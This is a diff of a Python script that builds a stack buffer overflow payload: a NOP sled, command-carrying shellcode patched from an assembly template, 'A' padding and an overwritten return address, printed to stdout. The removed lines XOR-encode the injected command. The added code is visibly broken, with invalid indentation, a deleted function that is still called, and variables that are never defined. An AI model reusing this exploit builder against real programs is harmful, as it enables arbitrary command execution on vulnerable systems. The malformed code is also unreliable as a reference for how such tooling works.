@@ -1,44 +1,30 @@
 TEMPLATE_FILE = "modifiedcode.asm"
-OUTPUT_FILE   = "shellcode.asm"
-XOR_KEY = 0x41
-
-
-def prepare_command(cmd: str):
-    cmd_bytes = cmd.encode("ascii")
-
-    if b"\x00" in cmd_bytes:
-        raise ValueError("Command darf keine Nullbytes enthalten")
-
-    patched = cmd_bytes[:-1] + bytes([cmd_bytes[-1] ^ XOR_KEY])
-    xor_offset = len(cmd_bytes) - 1
-
-    db_string = '"' + patched.decode("latin1") + '"'
-
-    return xor_offset, db_string
-
-
-def main(command: str):
-    with open(TEMPLATE_FILE, "r") as f:
-        asm = f.read()
-
-    xor_offset, db_string = prepare_command(command)
-
-    asm = asm.replace("{{XOR_OFFSET}}", str(xor_offset))
-    asm = asm.replace("{{COMMAND_BYTES}}", db_string)
-
-    with open(OUTPUT_FILE, "w") as f:
-        f.write(asm)
-
-    print(f"[+] Command       : {command}")
-    print(f"[+] XOR offset    : {xor_offset}")
-    print(f"[+] Output written: {OUTPUT_FILE}")
+import os
 
 
 if __name__ == "__main__":
-    import sys
+import sys 
+    if len(sys.argv) == 4:
+    address = bytes.fromhex(sys.argv[1])[::-1] #reverse for little-endian (Stack)
+    shellcodeFile = sys.argv[2]
+    command = sys.argv[3]
+else:
+    print("Usage:", sys.argv[0], "return_address(&buffer) shellcode_filename command")
+    sys.exit(1)
+f = open(TEMPLATE_FILE, "rb")
+asm = bytearray(f.read())
+f.close()
 
-    if len(sys.argv) != 2:
-        print(f"Usage: {sys.argv[0]} \"<command>\"")
-        sys.exit(1)
+xor_offset, db_string = prepare_command(command)
 
-    main(sys.argv[1])
+asm = asm.index("XOR_OFFSET", str(xor_offset))
+asmOffset = asm - 1
+commandBytes = command.encode("ascii")
+shellcode = shellcode.replace("REPLACE_ME".encode("ascii"), commandBytes + b"\x0a")
+shellcode[sizeOffset] = len(commandBytes).to_bytes()[0]
+bufferSize = 200
+nopSled = b"\x90" * 16
+paddingSize = 16
+padding = b"A" * (bufferSize - len(nopSled) - len(shellcode) + paddingSize)
+os.write(1, nopSled + shellcode + padding + address)
+
